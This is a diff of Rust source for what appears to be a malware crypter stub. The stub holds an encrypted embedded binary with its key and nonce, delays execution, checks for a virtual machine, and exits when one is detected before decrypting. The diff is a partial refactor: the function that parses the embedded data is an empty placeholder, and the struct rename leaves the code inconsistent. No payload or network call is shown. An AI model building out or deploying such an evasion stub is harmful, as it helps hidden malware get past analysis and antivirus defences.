@@ -1,32 +1,33 @@
-pub struct Stub  {
-    encrypted_bin : String,
-    output : String,
+pub struct EmbeddedData {
+    cipher_bin: Vec<u8>,
+    key: [u8; 32],
+    nonce: [u8; 12],
     delay : u64,
-    padding: u32,
-    key : String,
-    verbose : Boolean,
-    vm_detection : Boolean
+    verbose : bool,
+    vm_detection : bool
 }
 
 impl Stub {
     pub fn new(
-        encrypted_bin : String,
-        output : String,
+        cipher_bin : Vec<u8>,
+        key: [u8; 32],
+        nonce: [u8; 12],
         delay : u64,
-        padding : u32,
-        key: String,
-        verbose: Boolean,
-        vm_detection: Boolean
+        verbose: bool,
+        vm_detection: bool
     ) -> Stub {
         Stub {
-            encrypted_bin,
-            output,
-            delay,
-            padding,
+            cipher_bin,
             key,
+            nonce,
+            delay,
             verbose,
             vm_detection
         }
+    }
+
+    pub fn parse_embedded(self_data: &[u8]) -> Option<EmbeddedData>{
+        return None;
     }
 
     pub fn decrypt(stub: &Stub) {
@@ -87,7 +88,6 @@ fn main() {
         // todo instead of exiting , we can make change the program behavior
         std::process::exit(0);
     }
-
 
     Stub::delay_execution(&stub);
     Stub::decrypt(&stub);
